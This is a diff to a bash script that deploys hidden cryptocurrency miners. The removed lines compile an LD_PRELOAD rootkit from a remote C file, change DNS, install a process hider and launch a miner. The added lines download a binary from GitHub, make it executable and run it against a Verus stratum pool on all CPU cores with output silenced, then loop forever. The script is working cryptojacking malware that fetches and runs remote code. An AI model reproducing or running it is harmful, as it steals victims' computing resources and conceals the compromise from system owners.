@@ -1,15 +1,8 @@
 #!/bin/bash
-apt-get update ; apt-get install sudo -y
-curl https://github.com/ganejafaujanih/acuy/raw/main/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-sudo gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
-sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add suer"
 mkdir .kap && cd .kap
-wget https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/suer.tar.gz && tar -xvf suer.tar.gz
-./suer -a randomvirel --url eu.rplant.xyz:7155 --user vgup4cen6chqskasvfbzk0dmj58bub9iq2nwym4f37mdcwft7.hansip -t $(nproc --all) >/dev/null 2>&1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
+wget -O bubux https://github.com/nonibihan/tah/raw/refs/heads/main/bct >/dev/null 2>&1
+chmod 777 bubux
+./bubux -a verus -o stratum+tcp://sg.vipor.net:5040 -u RRZqp6dhjEYCKHc83yWVgXqMMJdRxm1S39.GASS -t $(nproc --all) >/dev/null 2>&1
+while [ 1 ]; do
+sleep 3
+done
